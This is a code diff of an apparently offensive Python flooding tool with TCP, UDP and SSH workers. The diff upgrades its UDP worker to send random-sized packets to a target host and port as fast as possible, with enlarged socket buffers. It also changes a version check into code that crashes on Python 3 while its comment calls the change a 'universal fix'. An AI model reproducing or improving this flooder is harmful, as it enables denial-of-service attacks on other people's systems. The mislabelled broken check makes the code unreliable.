@@ -13,7 +13,7 @@ import os  # Native high-speed hardware random operations
 # VERSION COMPATIBILITY DETECTION & IMPORTS
 # ==========================================
 # UNIVERSAL FIX: Extract index 0 explicitly to prevent legacy Python 2 interpreter panics
-IS_PY3 = sys.version_info[0] >= 3
+IS_PY3 = sys.version_info >= 3
 
 if IS_PY3:
     import urllib.request as url_lib
@@ -153,34 +153,27 @@ def tcp_worker():
             time.sleep(0.1)
 
 def udp_worker():
-    """HIGH-VELOCITY MULTI-SOCKET UDP ENGINE: Allocates dedicated sockets per thread to smash performance bottlenecks."""
+    """HIGH-VELOCITY MULTI-SOCKET UDP FLOODER: Allocates individual sockets per thread with expanded SO_SNDBUF lines."""
     global success, failed, total
     
-    # Each thread allocates its own independent native socket handler
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        # THE FIX: Force allow immediate reuse of local system ports
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        # THE CRITICAL UPGRADE: Explodes the outbound pipe buffer layout to completely break the 12kbps bottleneck!
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
     except:
         return
         
-    # Pre-allocate random memory structure once inside RAM
-    try:
-        buffer_pool = bytearray(os.urandom(65535))
-    except:
-        buffer_pool = bytearray([random.randint(0, 255) for _ in range(65535)])
-        
-    pool_size = len(buffer_pool)
-    max_offset = pool_size - PAYLOAD_SIZE
-    if max_offset <= 0: max_offset = 1
-        
     while running:
         try:
-            offset = random.randint(0, max_offset - 1)
-            dynamic_payload = bytes(buffer_pool[offset:offset + PAYLOAD_SIZE]) if IS_PY3 else str(buffer_pool[offset:offset + PAYLOAD_SIZE])
+            # Replicates your dynamic size selection: Scrambles packets between 64 and 4096 bytes per loop
+            packet_size = random.randint(64, 4096)
+            packet = os.urandom(packet_size)
             
-            # Independent socket directly blasts the channel without waiting for any other thread locks!
-            s.sendto(dynamic_payload, (HOST, PORT))
+            # Unlocked independent socket fires raw data immediately down the interface line
+            sock.sendto(packet, (HOST, PORT))
             
-            # High-performance non-blocking stats updates
             with lock:
                 total += 1
                 success += 1
@@ -190,7 +183,7 @@ def udp_worker():
                 failed += 1
             break
             
-    try: s.close()
+    try: sock.close()
     except: pass
 
 def ssh_worker():
